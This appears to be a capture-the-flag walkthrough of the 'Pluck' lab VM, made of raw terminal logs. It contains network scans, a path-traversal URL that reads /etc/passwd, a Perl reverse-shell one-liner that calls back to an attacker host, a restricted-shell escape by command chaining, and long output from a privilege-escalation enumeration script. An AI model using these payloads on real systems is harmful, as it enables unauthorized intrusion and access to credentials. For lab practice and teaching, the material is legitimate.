Currently scanning: Finished!   |   Screen View: Unique Hosts                                                         

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                       
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.118.1   00:50:56:c0:00:08      1      60  Unknown vendor                                                      
 192.168.118.2   00:50:56:f4:18:88      1      60  Unknown vendor                                                      
 192.168.118.189 00:0c:29:57:ee:bd      1      60  Unknown vendor                                                      
 192.168.118.254 00:50:56:f9:43:a8      1      60  Unknown vendor                                                      
root@kali:~/pluck#


root@kali:~/pluck# nmap -v -T 4 -A -p 1-65535 192.168.118.189

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-21 17:24 MDT
NSE: Loaded 143 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:24
Completed NSE at 17:24, 0.00s elapsed
Initiating NSE at 17:24
Completed NSE at 17:24, 0.00s elapsed
Initiating ARP Ping Scan at 17:24
Scanning 192.168.118.189 [1 port]
Completed ARP Ping Scan at 17:24, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:24
Completed Parallel DNS resolution of 1 host. at 17:24, 0.06s elapsed
Initiating SYN Stealth Scan at 17:24
Scanning 192.168.118.189 [65535 ports]
Discovered open port 22/tcp on 192.168.118.189
Discovered open port 80/tcp on 192.168.118.189
Discovered open port 3306/tcp on 192.168.118.189
Discovered open port 5355/tcp on 192.168.118.189
Completed SYN Stealth Scan at 17:24, 1.80s elapsed (65535 total ports)
Initiating Service scan at 17:24
Scanning 4 services on 192.168.118.189
Completed Service scan at 17:26, 115.22s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.118.189
NSE: Script scanning 192.168.118.189.
Initiating NSE at 17:26
Completed NSE at 17:26, 0.29s elapsed
Initiating NSE at 17:26
Completed NSE at 17:26, 1.01s elapsed
Nmap scan report for 192.168.118.189
Host is up (0.00050s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Pluck
3306/tcp open  mysql   MySQL (unauthorized)
5355/tcp open  llmnr?
MAC Address: 00:0C:29:57:EE:BD (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.6
Uptime guess: 198.841 days (since Thu Nov  3 21:16:20 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 192.168.118.189

NSE: Script Post-scanning.
Initiating NSE at 17:26
Completed NSE at 17:26, 0.00s elapsed
Initiating NSE at 17:26
Completed NSE at 17:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.63 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
root@kali:~/pluck#


root@kali:~/pluck# nikto -h 192.168.118.189
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.118.189
+ Target Hostname:    192.168.118.189
+ Target Port:        80
+ Start Time:         2017-05-21 17:29:36 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-3092: /admin.php: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2017-05-21 17:29:49 (GMT-6) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

**

Thanks nikto!

http://192.168.118.189/index.php?page=../../../../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:109::/var/run/dbus:/bin/false mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false lxd:x:108:65534::/var/lib/lxd/:/bin/false uuidd:x:109:114::/run/uuidd:/bin/false dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:112:1::/var/cache/pollinate:/bin/false bob:x:1000:1000:bob,,,:/home/bob:/bin/bash Debian-exim:x:113:119::/var/spool/exim4:/bin/false peter:x:1001:1001:,,,:/home/peter:/bin/bash paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh

***

/usr/local/scripts/backup.sh

http://192.168.118.189/index.php?page=../../../../../../../../../../usr/local/scripts/backup.sh

#!/bin/bash ######################## # Server Backup script # ########################
#Backup directories in /backups so we can get it via tftp
echo "Backing up data" tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null
echo "Backup complete"

Interesting, I used wget to pull the backup file.....and killed the transfer after about 1GB.

Digging in the file with less I found some keys in paul's folder.  key4 got me into PDmenu.

Fun, lets start by looking at the admin.php file.  See if there is any credentals.

OH!  Isn't that cute....

if(strpos($_POST['email'], '\'') !== false) {
        echo  "<strong>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 6</strong>";
}else{
        echo  "<strong>Incorrect Username or Password!</strong>";


__

Using PDMenu I can read the www directory, but not write to it.  No php-reverse-shell for me.  The ping and telnet options truncate any extra commands....but the edit menu doesn't!

No python on the server, but there is perl.  Let's try a reverse shell from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

We'll start by getting netcat to listen:

root@kali:~/pluck# nc -lvp 443
listening on [any] 443 ...

perl -e 'use Socket;$i="192.168.118.186";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Nope, that breaks the parsing.

Edit a file to create shell.pl with that perl oneline in it, edit a file and tack on && sh shell.pl.  Huzaah, that gives me a shell.

$ cat /proc/version
Linux version 4.8.0-22-generic (buildd@lgw01-11) (gcc version 6.2.0 20161005 (Ubuntu 6.2.0-5ubuntu12) ) #24-Ubuntu SMP Sat Oct 8 09:15:00 UTC 2016

$ dpkg --get-selections | grep deinstall
apparmor					deinstall
apport						deinstall
byobu						deinstall
command-not-found				deinstall
exim4-base					deinstall
exim4-config					deinstall
language-selector-common			deinstall
libpython2.7-minimal:amd64			deinstall
libyaml-0-2:amd64				deinstall
lsb-release					deinstall
lxc-common					deinstall
lxd						deinstall
mdadm						deinstall
nano						deinstall
open-vm-tools					deinstall
plymouth-theme-ubuntu-text			deinstall
python						deinstall
python2.7-minimal				deinstall
python3						deinstall
python3.5-minimal				deinstall
snap-confine					deinstall
snapd						deinstall
software-properties-common			deinstall
sosreport					deinstall
ssh-import-id					deinstall
tcpdump						deinstall
tmux						deinstall
ubuntu-core-launcher				deinstall
ubuntu-release-upgrader-core			deinstall
ufw						deinstall
unattended-upgrades				deinstall
update-notifier-common				deinstall

$ curl -O https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 43283  100 43283    0     0  23731      0  0:00:01  0:00:01 --:--:-- 23729
$ chmod +x LinEnum.sh
$ ./LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
#

Debug Info
thorough tests = disabled


Scan started at:
Mon May 22 03:29:47 SAST 2017


### SYSTEM ##############################################
Kernel information:
Linux pluck 4.8.0-22-generic #24-Ubuntu SMP Sat Oct 8 09:15:00 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux


Kernel information (continued):
Linux version 4.8.0-22-generic (buildd@lgw01-11) (gcc version 6.2.0 20161005 (Ubuntu 6.2.0-5ubuntu12) ) #24-Ubuntu SMP Sat Oct 8 09:15:00 UTC 2016


Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.10
DISTRIB_CODENAME=yakkety
DISTRIB_DESCRIPTION="Ubuntu 16.10"
NAME="Ubuntu"
VERSION="16.10 (Yakkety Yak)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.10"
VERSION_ID="16.10"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="http://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=yakkety
UBUNTU_CODENAME=yakkety


Hostname:
pluck


### USER/GROUP ##########################################
Current user/group info:
uid=1002(paul) gid=1002(paul) groups=1002(paul)


Users that have previously logged onto the system:
Username         Port     From             Latest
root                                       Thu Jan  1 02:00:10 +0200 1970
paul             pts/2    192.168.118.186  Mon May 22 03:23:04 +0200 2017


Who else is logged on:
 03:29:47 up  2:07,  2 users,  load average: 1.05, 1.36, 0.91
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
paul     pts/1    192.168.118.186  03:16    9:21   0.02s  0.00s w
paul     pts/2    192.168.118.186  03:23    6:43   0.01s  0.01s -pdmenu


Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=109(messagebus) groups=109(messagebus)
uid=107(mysql) gid=111(mysql) groups=111(mysql)
uid=108(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=109(uuidd) gid=114(uuidd) groups=114(uuidd)
uid=110(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=112(pollinate) gid=1(daemon) groups=1(daemon)
uid=1000(bob) gid=1000(bob) groups=1000(bob),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),112(lxd),117(lpadmin),118(sambashare)
uid=113(Debian-exim) gid=119(Debian-exim) groups=119(Debian-exim)
uid=1001(peter) gid=1001(peter) groups=1001(peter)
uid=1002(paul) gid=1002(paul) groups=1002(paul)
uid=1003(backup-user) gid=1003(backup-home) groups=1003(backup-home)


Sample entires from /etc/passwd (searching for uid values 0, 500, 501, 502, 1000, 1001, 1002, 2000, 2001, 2002):
root:x:0:0:root:/root:/bin/bash
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
peter:x:1001:1001:,,,:/home/peter:/bin/bash
paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu


Super user account(s):
root


Are permissions on /home directories lax:
total 20K
drwxr-xr-x  5 root  root  4.0K Jan 18 10:27 .
drwxr-xr-x 23 root  root  4.0K Jan 18 11:14 ..
drwxr-xr-x  3 bob   bob   4.0K Jan 19 13:24 bob
drwxr-xr-x  6 paul  paul  4.0K May 22 03:29 paul
drwxr-xr-x  2 peter peter 4.0K Jan 19 13:22 peter


### ENVIRONMENTAL #######################################
 Environment information:
XDG_SESSION_ID=8
SHELL=/usr/bin/pdmenu
TERM=xterm-256color
SSH_CLIENT=192.168.118.186 56140 22
SSH_TTY=/dev/pts/1
USER=paul
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
MAIL=/var/mail/paul
PWD=/home/paul
LANG=en_ZA.UTF-8
SHLVL=1
HOME=/home/paul
LANGUAGE=en_ZA:en
LOGNAME=paul
SSH_CONNECTION=192.168.118.186 56140 192.168.118.189 22
XDG_RUNTIME_DIR=/run/user/1002
_=/usr/bin/env


Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games


Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/screen


Current umask value:
0002
u=rwx,g=rwx,o=rx


umask value as specified in /etc/login.defs:
UMASK		022


Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Jan 18 07:26 .
drwxr-xr-x 98 root root 4096 Jan 19 20:02 ..
-rw-r--r--  1 root root  589 Jul 26  2016 mdadm
-rw-r--r--  1 root root  670 Aug 15  2016 php
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  190 Jan 18 07:26 popularity-contest

/etc/cron.daily:
total 68
drwxr-xr-x  2 root root 4096 Jan 18 21:36 .
drwxr-xr-x 98 root root 4096 Jan 19 20:02 ..
-rwxr-xr-x  1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x  1 root root  376 Jul 28  2016 apport
-rwxr-xr-x  1 root root 1474 Oct  4  2016 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Apr 25  2016 dpkg
-rwxr-xr-x  1 root root 4125 Aug 17  2016 exim4-base
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 26  2016 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 19  2014 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 Jul 12  2013 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jan 18 07:18 .
drwxr-xr-x 98 root root 4096 Jan 19 20:02 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jan 18 07:18 .
drwxr-xr-x 98 root root 4096 Jan 19 20:02 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Jan 18 07:31 .
drwxr-xr-x 98 root root 4096 Jan 19 20:02 ..
-rwxr-xr-x  1 root root   86 Sep 12  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  211 Jul 12  2013 update-notifier-common


Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


### NETWORKING  ##########################################
Network & IP info:
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.118.189  netmask 255.255.255.0  broadcast 192.168.118.255
        inet6 fe80::20c:29ff:fe57:eebd  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:57:ee:bd  txqueuelen 1000  (Ethernet)
        RX packets 297679  bytes 21475215 (21.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3354068  bytes 9208155709 (9.2 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 571  bytes 46383 (46.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 571  bytes 46383 (46.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


ARP history:
? (192.168.118.254) at 00:50:56:f9:43:a8 [ether] on eth0
gateway (192.168.118.2) at 00:50:56:f4:18:88 [ether] on eth0
? (192.168.118.186) at 00:0c:29:34:4b:b0 [ether] on eth0


Nameserver(s):
nameserver 192.168.118.2
nameserver 127.0.0.53


Default route:
default         gateway         0.0.0.0         UG    0      0        0 eth0


Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 192.168.118.189:22      192.168.118.186:56140   ESTABLISHED -                   
tcp        0      0 192.168.118.189:56110   192.168.118.186:443     ESTABLISHED 8528/sh             
tcp        0      0 192.168.118.189:22      192.168.118.186:56142   ESTABLISHED -                   
tcp6       0      0 :::5355                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   


Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 0.0.0.0:5355            0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:69              0.0.0.0:*                           -                   
udp6       0      0 :::5355                 :::*                                -                   


### SERVICES #############################################
Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.9  55144  4504 ?        Ss   01:22   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    01:22   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    01:22   0:01 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   01:22   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    01:22   0:00 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    01:22   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    01:22   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S<   01:22   0:00 [lru-add-drain]
root        11  0.0  0.0      0     0 ?        S    01:22   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    01:22   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    01:22   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        S<   01:22   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    01:22   0:00 [khungtaskd]
root        16  0.0  0.0      0     0 ?        S    01:22   0:00 [oom_reaper]
root        17  0.0  0.0      0     0 ?        S<   01:22   0:00 [writeback]
root        18  0.0  0.0      0     0 ?        S    01:22   0:00 [kcompactd0]
root        19  0.0  0.0      0     0 ?        SN   01:22   0:00 [ksmd]
root        20  0.0  0.0      0     0 ?        S<   01:22   0:00 [crypto]
root        21  0.0  0.0      0     0 ?        S<   01:22   0:00 [kintegrityd]
root        22  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        23  0.0  0.0      0     0 ?        S<   01:22   0:00 [kblockd]
root        24  0.0  0.0      0     0 ?        S<   01:22   0:00 [ata_sff]
root        25  0.0  0.0      0     0 ?        S<   01:22   0:00 [md]
root        26  0.0  0.0      0     0 ?        S<   01:22   0:00 [devfreq_wq]
root        27  0.0  0.0      0     0 ?        S<   01:22   0:00 [watchdogd]
root        31  0.0  0.0      0     0 ?        S    01:22   0:00 [kswapd0]
root        32  0.0  0.0      0     0 ?        S<   01:22   0:00 [vmstat]
root        33  0.0  0.0      0     0 ?        S    01:22   0:00 [ecryptfs-kthrea]
root        72  0.0  0.0      0     0 ?        S<   01:22   0:00 [kthrotld]
root        73  0.0  0.0      0     0 ?        S<   01:22   0:00 [acpi_thermal_pm]
root        74  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        75  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        76  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        77  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        78  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        79  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        80  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        81  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        82  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        83  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        84  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        85  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        86  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        87  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        88  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        89  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        90  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        91  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        92  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        93  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        94  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        95  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        96  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        97  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root        98  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_0]
root        99  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_0]
root       100  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_1]
root       101  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_1]
root       108  0.0  0.0      0     0 ?        S<   01:22   0:00 [ipv6_addrconf]
root       129  0.0  0.0      0     0 ?        S<   01:22   0:00 [deferwq]
root       130  0.0  0.0      0     0 ?        S<   01:22   0:00 [charger_manager]
root       131  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root       182  0.0  0.0      0     0 ?        S<   01:22   0:00 [ttm_swap]
root       184  0.0  0.0      0     0 ?        S<   01:22   0:00 [kpsmoused]
root       195  0.0  0.0      0     0 ?        S<   01:22   0:00 [kworker/0:1H]
root       230  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_2]
root       231  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_2]
root       232  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_3]
root       233  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_3]
root       234  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_4]
root       235  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_4]
root       236  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_5]
root       237  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_5]
root       238  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_6]
root       239  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_6]
root       240  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_7]
root       241  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_7]
root       242  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_8]
root       243  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_8]
root       244  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_9]
root       245  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_9]
root       246  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_10]
root       247  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_10]
root       248  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_11]
root       249  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_11]
root       250  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_12]
root       251  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_12]
root       252  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_13]
root       253  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_13]
root       254  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_14]
root       255  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_14]
root       256  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_15]
root       257  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_15]
root       258  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_16]
root       259  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_16]
root       260  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_17]
root       261  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_17]
root       262  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_18]
